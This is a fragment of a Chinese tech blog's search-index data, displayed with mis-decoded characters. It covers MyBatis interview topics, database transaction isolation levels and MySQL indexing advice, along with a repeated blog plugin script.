Executorï¼ˆæ‰§è¡Œå™¨ï¼‰ï¼šè´Ÿè´£æ•´ä¸ª SQL æ‰§è¡Œè¿‡ç¨‹çš„æ€»ä½“æ§åˆ¶ StatementHandlerï¼ˆè¯­å¥å¤„ç†å™¨ï¼‰ï¼šè´Ÿè´£å’Œ JDBC å±‚äº¤äº’ï¼ŒåŒ…æ‹¬é¢„ç¼–è¯‘ SQL è¯­å¥å’Œæ‰§è¡Œ SQL è¯­å¥ï¼Œä»¥åŠè°ƒç”¨ ParameterHandler è®¾ç½®å‚æ•° ParameterHandlerï¼ˆå‚æ•°å¤„ç†å™¨ï¼‰ï¼šè´Ÿè´£è®¾ç½®é¢„ç¼–è¯‘å‚æ•° ResultSetHandlerï¼ˆç»“æœé›†å¤„ç†å™¨ï¼‰ï¼šè´Ÿè´£å°† JDBC æŸ¥è¯¢ç»“æœæ˜ å°„åˆ° JavaBean å¯¹è±¡ å››å¤§å¯¹è±¡çš„å·¥ä½œæµç¨‹ ä¸€çº§ç¼“å­˜å¤±æ•ˆçš„å››ç§åœºæ™¯ ä½¿ç”¨ä¸åŒçš„ SqlSession è¿›è¡ŒæŸ¥è¯¢ åŒä¸€ä¸ª SqlSessionï¼Œä½†æ˜¯æŸ¥è¯¢æ¡ä»¶ä¸åŒ åŒä¸€ä¸ª SqlSessionï¼Œä½†æ˜¯åœ¨ä¸¤æ¬¡æŸ¥è¯¢æœŸé—´æ‰‹åŠ¨æ¸…ç©ºäº†ä¸€çº§ç¼“å­˜ åŒä¸€ä¸ª SqlSessionï¼Œä½†æ˜¯åœ¨ä¸¤æ¬¡æŸ¥è¯¢æœŸé—´æ‰§è¡Œäº†ä»»ä½•ä¸€æ¬¡å¢åˆ æ”¹æ“ä½œ è§£å†³å®ä½“ç±»çš„å±æ€§åä¸è¡¨çš„å­—æ®µåä¸ä¸€è‡´é—®é¢˜ä¸‰ç§è§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š ç¼–å†™ SQL è¯­å¥æ—¶ä½¿ç”¨å­—æ®µåˆ«å åœ¨ MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶ä¸­å¼€å¯é©¼å³°å‘½åè§„åˆ™ åœ¨ Mapper æ˜ å°„æ–‡ä»¶ä¸­ä½¿ç”¨ resultMap æ¥è‡ªå®šä¹‰æ˜ å°„è§„åˆ™ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"æ•°æ®åº“é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/51a718cc.html",text:'æ•°æ®åº“æ•°æ®åº“å¹¶å‘é—®é¢˜è„è¯»A äº‹åŠ¡æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼ŒB äº‹åŠ¡è¯»å–äº† A äº‹åŠ¡çš„ä¿®æ”¹ã€‚ä½†æ˜¯ç”±äºæŸäº›åŸå› ï¼ŒA äº‹åŠ¡æ²¡æœ‰å®Œæˆæäº¤ï¼Œå‘ç”Ÿ RollBack æ“ä½œï¼Œåˆ™ B äº‹åŠ¡æ‰€è¯»å–çš„æ•°æ®å°±ä¼šæ˜¯ä¸æ­£ç¡®çš„ï¼Œè¿™ä¸ªæœªæäº¤æ•°æ®å°±æ˜¯è„è¯»ï¼ˆDirty Readï¼‰ã€‚è„è¯»äº§ç”Ÿçš„æµç¨‹å¦‚ä¸‹ï¼š å¹»è¯»B äº‹åŠ¡è¯»å–äº†ä¸¤æ¬¡æ•°æ®ï¼Œåœ¨è¿™ä¸¤æ¬¡çš„è¯»å–è¿‡ç¨‹ä¸­ A äº‹åŠ¡æ·»åŠ äº†æ•°æ®ï¼ŒB äº‹åŠ¡çš„è¿™ä¸¤æ¬¡è¯»å–å‡ºæ¥çš„é›†åˆä¸ä¸€æ ·ã€‚å¹»è¯»çœ‹èµ·æ¥å’Œä¸å¯é‡å¤è¯»å·®ä¸å¤šï¼Œä½†å¹»è¯»å¼ºè°ƒçš„é›†åˆçš„å¢å‡ï¼Œè€Œä¸æ˜¯å•ç‹¬ä¸€æ¡æ•°æ®çš„ä¿®æ”¹ã€‚å¹»è¯»äº§ç”Ÿçš„æµç¨‹å¦‚ä¸‹ï¼š ä¸å¯é‡å¤è¯»B äº‹åŠ¡è¯»å–äº†ä¸¤æ¬¡æ•°æ®ï¼Œåœ¨è¿™ä¸¤æ¬¡çš„è¯»å–è¿‡ç¨‹ä¸­ A äº‹åŠ¡ä¿®æ”¹äº†æ•°æ®ï¼ŒB äº‹åŠ¡çš„è¿™ä¸¤æ¬¡è¯»å–å‡ºæ¥çš„æ•°æ®ä¸ä¸€æ ·ã€‚B äº‹åŠ¡è¿™ç§è¯»å–çš„ç»“æœï¼Œå³ä¸ºä¸å¯é‡å¤è¯»ï¼ˆNonrepeatable Readï¼‰ã€‚ä¸å¯é‡å¤è¯»çš„äº§ç”Ÿçš„æµç¨‹å¦‚ä¸‹ï¼š ç¬¬ä¸€ç±»ä¸¢å¤±æ›´æ–°åœ¨å®Œå…¨æœªéš”ç¦»äº‹åŠ¡çš„æƒ…å†µä¸‹ï¼Œä¸¤ä¸ªäº‹åŠ¡æ›´æ–°åŒä¸€æ¡æ•°æ®èµ„æºï¼ŒæŸä¸€äº‹åŠ¡å®Œæˆï¼Œå¦ä¸€äº‹åŠ¡å¼‚å¸¸ç»ˆæ­¢ï¼Œå›æ»šé€ æˆç¬¬ä¸€ä¸ªå®Œæˆçš„æ›´æ–°ä¹ŸåŒæ—¶ä¸¢å¤± ã€‚ç¬¬ä¸€ç±»ä¸¢å¤±æ›´æ–°çš„é—®é¢˜ï¼Œåœ¨ç°ä»£å…³ç³»å‹æ•°æ®åº“å·²ç»ä¸ä¼šå‘ç”Ÿï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ ç¬¬äºŒç±»ä¸¢å¤±æ›´æ–°ä¸å¯é‡å¤è¯»æœ‰ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œä¸¤ä¸ªäº‹åŠ¡æ›´æ–°åŒä¸€æ¡æ•°æ®èµ„æºï¼Œåå®Œæˆçš„äº‹åŠ¡ä¼šé€ æˆå…ˆå®Œæˆçš„äº‹åŠ¡æ›´æ–°ä¸¢å¤±ï¼Œè¿™ç§æƒ…å†µå°±æ˜¯ç¬¬äºŒç±»ä¸¢å¤±æ›´æ–°ã€‚ä¸»æµçš„æ•°æ®åº“å·²ç»é»˜è®¤å±è”½äº†ç¬¬ä¸€ç±»ä¸¢å¤±æ›´æ–°é—®é¢˜ï¼ˆå³ï¼šååšçš„äº‹åŠ¡æ’¤é”€ï¼Œå‘ç”Ÿå›æ»šé€ æˆå·²å®Œæˆäº‹åŠ¡çš„æ›´æ–°ä¸¢å¤±ï¼‰ï¼Œä½†æ—¥å¸¸å¼€å‘çš„æ—¶å€™ä»éœ€è¦ç‰¹åˆ«æ³¨æ„ç¬¬äºŒç±»ä¸¢å¤±æ›´æ–°ã€‚å®ƒäº§ç”Ÿçš„æµç¨‹å¦‚ä¸‹ï¼š æ•°æ®åº“éš”ç¦»çº§åˆ«ä¸ºäº†è§£å†³ä¸Šé¢æåŠçš„æ•°æ®åº“å¹¶å‘é—®é¢˜ï¼Œä¸»æµå…³ç³»å‹æ•°æ®åº“éƒ½ä¼šæä¾›å››ç§äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼š è¯»æœªæäº¤ï¼ˆRead Uncommittedï¼‰åœ¨è¯¥éš”ç¦»çº§åˆ«ï¼Œæ‰€æœ‰äº‹åŠ¡éƒ½å¯ä»¥çœ‹åˆ°å…¶ä»–æœªæäº¤äº‹åŠ¡çš„æ‰§è¡Œç»“æœã€‚è¯¥éš”ç¦»çº§åˆ«æ˜¯æœ€ä½çš„éš”ç¦»çº§åˆ«ï¼Œè™½ç„¶æ‹¥æœ‰è¶…é«˜çš„å¹¶å‘å¤„ç†èƒ½åŠ›åŠå¾ˆä½çš„ç³»ç»Ÿå¼€é”€ï¼Œä½†å¾ˆå°‘ç”¨äºå®é™…åº”ç”¨ã€‚å› ä¸ºé‡‡ç”¨è¿™ç§éš”ç¦»çº§åˆ«åªèƒ½é˜²æ­¢ç¬¬ä¸€ç±»æ›´æ–°ä¸¢å¤±é—®é¢˜ï¼Œä¸èƒ½è§£å†³è„è¯»ï¼Œå¹»è¯»åŠä¸å¯é‡å¤è¯»é—®é¢˜ã€‚ è¯»å·²æäº¤ï¼ˆRead Committedï¼‰è¿™æ˜¯å¤§å¤šæ•°æ•°æ®åº“ç³»ç»Ÿçš„é»˜è®¤éš”ç¦»çº§åˆ«ï¼ˆä½†ä¸æ˜¯ MySQL é»˜è®¤çš„ï¼‰ï¼Œä¾‹å¦‚ Oracle æ•°æ®åº“ã€‚å®ƒæ»¡è¶³äº†éš”ç¦»çš„ç®€å•å®šä¹‰ï¼šä¸€ä¸ªäº‹åŠ¡åªèƒ½çœ‹è§å·²ç»æäº¤äº‹åŠ¡æ‰€åšçš„æ”¹å˜ã€‚è¿™ç§éš”ç¦»çº§åˆ«å¯ä»¥é˜²æ­¢è„è¯»é—®é¢˜ï¼Œä½†ä¼šå‡ºç°å¹»è¯»åŠä¸å¯é‡å¤è¯»é—®é¢˜ã€‚ å¯é‡å¤è¯»ï¼ˆRepeatable Readï¼‰è¿™æ˜¯ MySQL çš„é»˜è®¤äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œå®ƒç¡®ä¿åœ¨æ•´ä¸ªäº‹åŠ¡è¿‡ç¨‹ä¸­ï¼Œå¯¹åŒä¸€æ¡æ•°æ®çš„è¯»å–ç»“æœæ˜¯ç›¸åŒçš„ï¼Œä¸ç®¡å…¶ä»–äº‹åŠ¡æ˜¯å¦åœ¨å¯¹å…±äº«æ•°æ®è¿›è¡Œæ›´æ–°ï¼Œä¹Ÿä¸ç®¡å…¶ä»–äº‹åŠ¡æ›´æ–°æäº¤ä¸å¦ï¼Œè¿™ç§éš”ç¦»çº§åˆ«å¯ä»¥é˜²æ­¢é™¤å¹»è¯»å¤–çš„å…¶ä»–é—®é¢˜ã€‚ ä¸²è¡ŒåŒ–ï¼ˆSerializableï¼‰è¿™æ˜¯æœ€é«˜çš„éš”ç¦»çº§åˆ«ï¼Œå®ƒé€šè¿‡å¼ºåˆ¶äº‹åŠ¡æ’åºï¼Œä½¿ä¹‹ä¸å¯èƒ½ç›¸äº’å†²çªï¼Œä»è€Œè§£å†³å¹»è¯»ã€ç¬¬äºŒç±»æ›´æ–°ä¸¢å¤±é—®é¢˜ã€‚åœ¨è¿™ä¸ªçº§åˆ«ï¼Œå¯ä»¥è§£å†³ä¸Šé¢æåˆ°çš„æ‰€æœ‰å¹¶å‘é—®é¢˜ï¼Œä½†å¯èƒ½å¯¼è‡´å¤§é‡çš„è¶…æ—¶ç°è±¡å’Œé”ç«äº‰ï¼Œé€šå¸¸æ•°æ®åº“ä¸ä¼šç”¨è¿™ä¸ªéš”ç¦»çº§åˆ«ï¼Œå¯ä»¥å…¶ä»–çš„æœºåˆ¶æ¥è§£å†³è¿™äº›é—®é¢˜ï¼Œä¾‹å¦‚ä¹è§‚é”å’Œæ‚²è§‚é”ã€‚ æ¡ˆä¾‹è¯´æ˜ ä¸Šå›¾ä¸­æ˜¯å…¸å‹çš„ç¬¬äºŒç±»ä¸¢å¤±æ›´æ–°é—®é¢˜ï¼Œåæœå¼‚å¸¸ä¸¥é‡ã€‚å½“æ•°æ®åº“éš”ç¦»çº§åˆ«ä¸ºè¯»å·²æäº¤ï¼ˆRead Committedï¼‰åŠä»¥ä¸‹éš”ç¦»çº§åˆ«æ—¶ï¼Œä¼šå‡ºç°ä¸å¯é‡å¤è¯»çš„ç°è±¡ã€‚ä»ä¸Šé¢çš„è¡¨æ ¼å¯ä»¥çœ‹å‡ºï¼Œå½“äº‹åŠ¡éš”ç¦»çº§åˆ«è®¾ç½®ä¸ºå¯é‡å¤è¯»ï¼ˆRepeatable Readï¼‰æ—¶ï¼Œå¯ä»¥é¿å…ä¸å¯é‡å¤è¯»çš„ç°è±¡å‡ºç°ã€‚ æ€»ç»“è¿™å››ç§éš”ç¦»çº§åˆ«ä¼šäº§ç”Ÿçš„é—®é¢˜å¦‚ä¸‹ï¼ˆYES è¡¨ç¤ºå­˜åœ¨å¯¹åº”çš„é—®é¢˜ï¼‰ï¼š MySQLç´¢å¼•ç´¢å¼•çš„ç±»å‹ï¼ˆå››ç§ï¼‰ FULLTEXTï¼šå³ä¸ºå…¨æ–‡ç´¢å¼•ï¼Œç›®å‰åªæœ‰ MyISAM å¼•æ“æ”¯æŒï¼Œå…¶å¯ä»¥åœ¨ CREATE TABLEï¼ŒALTER TABLEï¼ŒCREATE INDEX ä½¿ç”¨ï¼Œä¸è¿‡ç›®å‰åªæœ‰ CHARã€VARCHARã€TEXT åˆ—ä¸Šå¯ä»¥åˆ›å»ºå…¨æ–‡ç´¢å¼• HASHï¼šç”±äº HASH çš„å”¯ä¸€æ€§åŠç±»ä¼¼é”®å€¼å¯¹çš„å½¢å¼ï¼Œå¾ˆé€‚åˆä½œä¸ºç´¢å¼•ï¼ŒHASH ç´¢å¼•å¯ä»¥ä¸€æ¬¡å®šä½ï¼Œä¸éœ€è¦åƒæ ‘å½¢ç´¢å¼•é‚£æ ·é€å±‚æŸ¥æ‰¾ï¼Œå› æ­¤å…·æœ‰æé«˜çš„æ•ˆç‡ã€‚ä½†æ˜¯ï¼Œè¿™ç§é«˜æ•ˆæ˜¯æœ‰æ¡ä»¶çš„ï¼Œå³åªåœ¨ â€œ=â€ å’Œ â€œinâ€ æ¡ä»¶ä¸‹æ‰é«˜æ•ˆï¼Œå¯¹äºèŒƒå›´æŸ¥è¯¢ã€æ’åºåŠç»„åˆç´¢å¼•ä»ç„¶æ•ˆç‡ä¸é«˜ BTREEï¼šä¸€ç§å°†ç´¢å¼•å€¼æŒ‰ä¸€å®šçš„ç®—æ³•ï¼Œå­˜å…¥ä¸€ä¸ªæ ‘å½¢çš„æ•°æ®ç»“æ„ä¸­ï¼ˆäºŒå‰æ ‘ï¼‰ï¼Œæ¯æ¬¡æŸ¥è¯¢éƒ½æ˜¯ä»æ ‘çš„å…¥å£ Root å¼€å§‹ï¼Œä¾æ¬¡éå† Nodeï¼Œè·å– Leafï¼Œè¿™æ˜¯ MySQL é‡Œé»˜è®¤å’Œæœ€å¸¸ç”¨çš„ç´¢å¼•ç±»å‹ RTREEï¼šåœ¨ MySQL å¾ˆå°‘ä½¿ç”¨ï¼Œä»…æ”¯æŒ geometry æ•°æ®ç±»å‹ï¼Œæ”¯æŒè¯¥ç±»å‹çš„å­˜å‚¨å¼•æ“æœ‰ MyISAMã€BDbã€InnoDbã€NDbã€Archive ç›¸å¯¹äº BTREEï¼ŒRTREE çš„ä¼˜åŠ¿åœ¨äºèŒƒå›´æŸ¥æ‰¾ã€‚ ç´¢å¼•çš„ç§ç±»ï¼ˆäº”ç§ï¼‰ æ™®é€šç´¢å¼•ï¼šä»…åŠ é€ŸæŸ¥è¯¢ å…¨æ–‡ç´¢å¼•ï¼šå¯¹æ–‡æœ¬çš„å†…å®¹è¿›è¡Œåˆ†è¯å’Œæœç´¢ å”¯ä¸€ç´¢å¼•ï¼šåŠ é€ŸæŸ¥è¯¢ + åˆ—å€¼å”¯ä¸€ï¼ˆå¯ä»¥æœ‰ NULLï¼‰ ä¸»é”®ç´¢å¼•ï¼šåŠ é€ŸæŸ¥è¯¢ + åˆ—å€¼å”¯ä¸€ï¼ˆä¸å¯ä»¥æœ‰ NULLï¼‰ + è¡¨ä¸­åªèƒ½æœ‰ä¸€ä¸ªä¸»é”®ç´¢å¼• ç»„åˆç´¢å¼•ï¼šå¤šåˆ—å€¼ç»„æˆä¸€ä¸ªç´¢å¼•ï¼Œä¸“é—¨ç”¨äºç»„åˆæœç´¢ï¼Œå…¶æ•ˆç‡å¤§äºç´¢å¼•åˆå¹¶ï¼ˆä½¿ç”¨å¤šä¸ªå•åˆ—ç´¢å¼•ç»„åˆæœç´¢ï¼‰ åˆ›å»ºç´¢å¼•çš„æ—¶æœºä¸€èˆ¬æ¥è¯´ï¼Œåœ¨ WHERE å’Œ JOIN å­å¥ä¸­å‡ºç°çš„åˆ—éœ€è¦å»ºç«‹ç´¢å¼•ï¼Œä½†ä¹Ÿä¸å®Œå…¨å¦‚æ­¤ï¼Œå› ä¸º MySQL åªå¯¹ &lt;ã€&lt;=ã€=ã€&gt;ã€&gt;=ã€BETWEENã€IN ä»¥åŠæŸäº›æ—¶å€™çš„ LIKE æ‰ä¼šä½¿ç”¨ç´¢å¼•ã€‚ä¾‹å¦‚ä¸‹è¿°çš„ SQL è¯­å¥ï¼Œå°±éœ€è¦å¯¹ city å’Œ age åˆ—å»ºç«‹ç´¢å¼•ï¼Œç”±äº mytable_m è¡¨çš„ userame ä¹Ÿå‡ºç°åœ¨äº† JOIN å­å¥ä¸­ï¼Œå› æ­¤ä¹Ÿæœ‰å¯¹å®ƒå»ºç«‹ç´¢å¼•çš„å¿…è¦ã€‚ 1SELECT t.Name FROM mytable_t LEFT JOIN mytable_m ON t.Name=m.username WHERE m.age=20 AND m.city=\'éƒ‘å·\' ; ç‰¹åˆ«æ³¨æ„ï¼šä¸Šé¢æåˆ°åªæœ‰æŸäº›æ—¶å€™çš„ LIKE æ‰éœ€å»ºç«‹ç´¢å¼•ï¼Œå› ä¸ºåœ¨ä»¥é€šé…ç¬¦ % å¼€å¤´ä½œæŸ¥è¯¢æ—¶ï¼ŒMySQL ä¸ä¼šä½¿ç”¨ç´¢å¼•ï¼›åªæœ‰ä»¥é€šé…ç¬¦ % ç»“å°¾åšæŸ¥è¯¢æ—¶ï¼ŒMySQL æ‰ä¼šä½¿ç”¨åˆ°ç´¢å¼•ã€‚ä½†æœ‰ä¸€ç§æƒ…å†µä¾‹å¤–ï¼Œé‚£å°±æ˜¯å½“è§¦å‘äº†è¦†ç›–ç´¢å¼•ï¼ˆselect çš„æ•°æ®åˆ—åªä»ç´¢å¼•ä¸­å°±èƒ½å¤Ÿå–å¾—ï¼Œä¸å¿…è¯»å–æ•°æ®è¡Œï¼Œæ¢å¥è¯è¯´æŸ¥è¯¢åˆ—è¦è¢«æ‰€å»ºçš„ç´¢å¼•è¦†ç›–ï¼‰çš„æƒ…å†µä¸‹ï¼Œä»¥é€šé…ç¬¦ % å¼€å¤´ä½œæŸ¥è¯¢ MySQL ä¹Ÿä¼šä½¿ç”¨ç´¢å¼•ã€‚ä¾‹å¦‚ï¼šå¦‚æœè¡¨é‡Œé¢åªæœ‰ id å’Œ username ä¸¤ä¸ªå­—æ®µä¸”éƒ½åŠ äº†ç´¢å¼•ï¼Œé‚£ä¹ˆ select * like \'%username\' æŸ¥è¯¢ä¹Ÿæ˜¯ä¼šä½¿ç”¨ç´¢å¼•çš„ï¼Œå‰ææ˜¯ select æ•°æ®åˆ—éƒ½åŠ äº†ç´¢å¼•ã€‚ å“ªäº›å­—æ®µåº”è¯¥åˆ›å»ºç´¢å¼• å¢åˆ æ”¹éå¸¸é¢‘ç¹çš„å­—æ®µä¸é€‚åˆä½œä¸ºç´¢å¼• æŸ¥è¯¢ä¸­ä¸å…¶ä»–è¡¨å…³è”çš„å­—æ®µï¼Œä¾‹å¦‚å¤–é”®åº”è¯¥å»ºç«‹ç´¢å¼• WHERE å’Œ JOIN å­å¥ä¸­ï¼Œè¾ƒé¢‘ç¹ä½œä¸ºæŸ¥è¯¢æ¡ä»¶çš„å­—æ®µåº”è¯¥åˆ›å»ºç´¢å¼• æŸ¥è¯¢ä¸­æ’åºï¼ˆorder byï¼‰ã€åˆ†ç»„ï¼ˆgroup byï¼‰ã€ç»Ÿè®¡çš„å­—æ®µåº”è¯¥å»ºç«‹ç´¢å¼• å”¯ä¸€æ€§å¤ªå·®çš„å­—æ®µä¸é€‚åˆåˆ›å»ºç´¢å¼•ï¼Œå°½ç®¡é¢‘ç¹ä½œä¸ºæŸ¥è¯¢æ¡ä»¶ï¼Œä¾‹å¦‚ï¼šæ€§åˆ«å­—æ®µ ç´¢å¼•ä¸ç”Ÿæ•ˆçš„æƒ…å†µ å¯¹äºå¤šåˆ—ç´¢å¼•ï¼Œå¦‚æœä¸æ˜¯ä½¿ç”¨çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œåˆ™ä¸ä¼šä½¿ç”¨ç´¢å¼• å¦‚æœ MySQL ä¼°ç®—ä½¿ç”¨å…¨è¡¨æ‰«æè¦æ¯”ä½¿ç”¨ç´¢å¼•å¿«ï¼Œåˆ™ä¸ä¼šä½¿ç”¨ç´¢å¼• like æŸ¥è¯¢ï¼Œå³æ˜¯ä»¥ % å¼€å¤´çš„æŸ¥è¯¢ä¸ä¼šä½¿ç”¨ç´¢å¼•ï¼Œé™¤é select æ•°æ®åˆ—éƒ½åŠ äº†ç´¢å¼• å¦‚æœåˆ—ç±»å‹æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¸€å®šè¦åœ¨æ¡ä»¶ä¸­å°†æ•°æ®ä½¿ç”¨å•å¼•å·åŒ…èµ·æ¥ï¼Œå¦åˆ™ç´¢å¼•ä¸ç”Ÿæ•ˆ å¦‚æœæ¡ä»¶ä¸­æœ‰ orï¼Œå³ä½¿å…¶ä¸­æœ‰éƒ¨åˆ†æ¡ä»¶å¸¦ç´¢å¼•ä¹Ÿä¸ä¼šä½¿ç”¨ã€‚æ¢è¨€ä¹‹ï¼Œå¿…é¡»æ‰€æœ‰åˆ—éƒ½å»ºæœ‰ç´¢å¼•æ‰æœ‰æ•ˆ ç´¢å¼•ä½¿ç”¨çš„ä»£ä»· ç´¢å¼•è™½ç„¶å¯ä»¥å¤§å¤§æé«˜äº†æŸ¥è¯¢é€Ÿåº¦ï¼Œä½†åŒæ—¶ä¹Ÿä¼šé™ä½æ›´æ–°è¡¨çš„é€Ÿåº¦ï¼Œå¦‚å¯¹è¡¨è¿›è¡Œ INSERTã€UPDATE å’Œ DELETE æ“ä½œï¼›å› ä¸ºæ›´æ–°è¡¨æ—¶ï¼ŒMySQL ä¸ä»…è¦ä¿å­˜æ•°æ®ï¼Œè¿˜è¦æ›´æ–°ç´¢å¼•æ–‡ä»¶ å»ºç«‹ç´¢å¼•ä¼šå ç”¨æ›´å¤šçš„ç£ç›˜ç©ºé—´ï¼Œè¿™æ˜¯å› ä¸ºéœ€è¦åˆ†é…ç£ç›˜ç©ºé—´ç»™ç´¢å¼•æ–‡ä»¶ï¼Œä¸€èˆ¬æƒ…å†µè¿™ä¸ªé—®é¢˜ä¸å¤ªä¸¥é‡ï¼Œä½†å¦‚æœåœ¨ä¸€ä¸ªå¤§è¡¨ä¸Šåˆ›å»ºäº†å¤šç§ç»„åˆç´¢å¼•ï¼Œç´¢å¼•æ–‡ä»¶çš„ä½“ç§¯ä¼šè†¨èƒ€å¾—å¾ˆå¿« ç´¢å¼•ä½¿ç”¨æ³¨æ„äº‹é¡¹ é’ˆå¯¹æ™®é€šæŸ¥è¯¢ é¿å…ä½¿ç”¨ select * è¿è¡¨æ—¶æ³¨æ„æ¡ä»¶ç±»å‹éœ€ä¸€è‡´ åˆ›å»ºè¡¨æ—¶å°½é‡æ—¶ char ä»£æ›¿ varchar &nbsp;count (1) æˆ– count (åˆ—) ä»£æ›¿&nbsp;count (*) ä½¿ç”¨è¡¨è¿æ¥ï¼ˆJOINï¼‰æ¥ä»£æ›¿å­æŸ¥è¯¢ï¼ˆSub-Queriesï¼‰ é’ˆå¯¹ç´¢å¼•ä½¿ç”¨ ä½¿ç”¨ç»„åˆç´¢å¼•ä»£æ›¿å¤šä¸ªå•åˆ—ç´¢å¼•ï¼ˆç»å¸¸ä½¿ç”¨å¤šä¸ªæ¡ä»¶æŸ¥è¯¢æ—¶ï¼‰ ç´¢å¼•æ•£åˆ—å€¼ï¼ˆé‡å¤å¤šçš„å€¼ï¼‰ä¸é€‚åˆå»ºç´¢å¼•ï¼Œä¾‹å¦‚ï¼šæ€§åˆ«å­—æ®µä¸é€‚åˆå»ºç´¢å¼• ç´¢å¼•ä¸ä¼šåŒ…å«æœ‰ NULL å€¼çš„åˆ—ï¼Œåªè¦åˆ—ä¸­åŒ…å«æœ‰ NULL å€¼éƒ½å°†ä¸ä¼šè¢«åŒ…å«åœ¨ç´¢å¼•ä¸­ï¼Œç»„åˆç´¢å¼•ä¸­åªè¦æœ‰ä¸€åˆ—å«æœ‰ NULL å€¼ï¼Œé‚£ä¹ˆè¿™ä¸€åˆ—å¯¹äºæ­¤ç»„åˆç´¢å¼•å°±æ˜¯æ— æ•ˆçš„ï¼Œå› æ­¤åœ¨æ•°æ®åº“è®¾è®¡æ—¶ä¸è¦è®©å­—æ®µçš„é»˜è®¤å€¼ä¸º NULL ä¸è¦åœ¨åˆ—ä¸Šè¿›è¡Œè¿ç®—ï¼Œä¾‹å¦‚ select * from users where YEAR(adddate)&lt;2007ï¼Œå°†åœ¨æ¯ä¸ªè¡Œè®°å½•ä¸Šè¿›è¡Œè¿ç®—ï¼Œè¿™å°†å¯¼è‡´ç´¢å¼•å¤±æ•ˆè€Œè¿›è¡Œå…¨è¡¨æ‰«æï¼Œå› æ­¤å¯ä»¥æ”¹æˆ select * from users where adddate&lt;â€™2007-01-01â€² å°½é‡ä½¿ç”¨çŸ­ç´¢å¼•ï¼Œå¯¹ä¸²åˆ—è¿›è¡Œç´¢å¼•ï¼Œå¦‚æœå¯èƒ½åº”è¯¥æŒ‡å®šä¸€ä¸ªå‰ç¼€é•¿åº¦ã€‚ä¾‹å¦‚ï¼šå¦‚æœæœ‰ä¸€ä¸ª CHAR (255) çš„åˆ—ï¼Œå¦‚æœåœ¨å‰ 10 ä¸ªæˆ– 20 ä¸ªå­—ç¬¦å†…ï¼Œå¤šæ•°å€¼æ˜¯æƒŸä¸€çš„ï¼Œé‚£ä¹ˆå°±ä¸è¦å¯¹æ•´ä¸ªåˆ—è¿›è¡Œç´¢å¼•ï¼›çŸ­ç´¢å¼•ä¸ä»…å¯ä»¥æé«˜æŸ¥è¯¢é€Ÿåº¦ï¼Œè¿˜å¯ä»¥èŠ‚çœç£ç›˜ç©ºé—´å’Œ I/O æ“ä½œ MySQL 5.0 ä¹‹å‰ï¼ŒSQL æŸ¥è¯¢åªèƒ½ä½¿ç”¨ä¸€ä¸ªç´¢å¼•ï¼Œå› æ­¤å¦‚æœ WHERE å­å¥ä¸­å·²ç»ä½¿ç”¨äº†ç´¢å¼•çš„è¯ï¼Œé‚£ä¹ˆ order byã€group by ä¸­çš„åˆ—æ˜¯ä¸ä¼šä½¿ç”¨ç´¢å¼•çš„ã€‚å› æ­¤å¦‚æœæ•°æ®åº“é»˜è®¤æ’åºå¯ä»¥ç¬¦åˆè¦æ±‚çš„æƒ…å†µä¸‹ï¼Œä¸è¦ä½¿ç”¨æ’åºæ“ä½œï¼ŒåŒæ—¶å°½é‡ä½¿ç”¨ä¸åŒ…å«å¤šä¸ªåˆ—çš„æ’åºï¼Œå¦‚æœéœ€è¦æœ€å¥½ç»™è¿™äº›åˆ—åˆ›å»ºç»„åˆç´¢å¼• var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"MyBatis å…¥é—¨æ•™ç¨‹ä¹‹ä¸‰",url:"/posts/2092c024.html",text:'SQL æ˜ å°„æ–‡ä»¶MyBatis çš„çœŸæ­£å¼ºå¤§åœ¨äºå®ƒçš„è¯­å¥æ˜ å°„ï¼Œè¿™æ˜¯å®ƒçš„é­”åŠ›æ‰€åœ¨ã€‚ç”±äºå®ƒçš„å¼‚å¸¸å¼ºå¤§ï¼Œæ˜ å°„å™¨çš„ XML æ–‡ä»¶å°±æ˜¾å¾—ç›¸å¯¹ç®€å•ã€‚å¦‚æœæ‹¿å®ƒè·Ÿå…·æœ‰ç›¸åŒåŠŸèƒ½çš„ JDBC ä»£ç è¿›è¡Œå¯¹æ¯”ï¼Œä¼šç«‹å³å‘ç°çœæ‰äº†å°†è¿‘ 95% çš„ä»£ç ã€‚MyBatis è‡´åŠ›äºå‡å°‘ä½¿ç”¨æˆæœ¬ï¼Œè®©ç”¨æˆ·èƒ½æ›´ä¸“æ³¨äº SQL ä»£ç ã€‚SQL æ˜ å°„æ–‡ä»¶åªæœ‰å¾ˆå°‘çš„å‡ ä¸ªé¡¶çº§æ ‡ç­¾ï¼ˆæŒ‰ç…§åº”è¢«å®šä¹‰çš„é¡ºåºåˆ—å‡ºï¼‰ï¼š cache â€“ 